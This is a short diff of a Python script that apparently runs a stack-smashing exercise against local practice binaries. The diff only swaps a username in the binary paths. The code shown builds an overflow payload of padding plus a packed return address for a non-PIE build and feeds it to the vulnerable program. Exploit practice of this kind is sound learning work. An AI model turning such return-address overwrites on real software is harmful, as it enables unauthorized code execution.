@@ -7,7 +7,7 @@ import re
 payload = b'hello there! general ken'
 #payload += p64(0x00005555555551fb, endian='little')
 
-p = Popen('/home/msprest/Desktop/StackSmash/newExample2',stdout=PIPE,stderr=PIPE,stdin=PIPE)
+p = Popen('/home/user/Desktop/StackSmash/newExample2',stdout=PIPE,stderr=PIPE,stdin=PIPE)
 print("Vulnerable function ran...")
 
 #get the inital load addr
@@ -41,7 +41,7 @@ print("Error: ", flag_attempt[1])
 # NO PIE
 #
 #########################################################################
-p = Popen('/home/msprest/Desktop/StackSmash/newExample2nopie',stdout=PIPE,stderr=PIPE,stdin=PIPE)
+p = Popen('/home/user/Desktop/StackSmash/newExample2nopie',stdout=PIPE,stderr=PIPE,stdin=PIPE)
 print("Next vulnerable function ran...\n")
 new_payload = b'hello there! general ken'
 new_payload += p64(0x004011e8, endian='little')
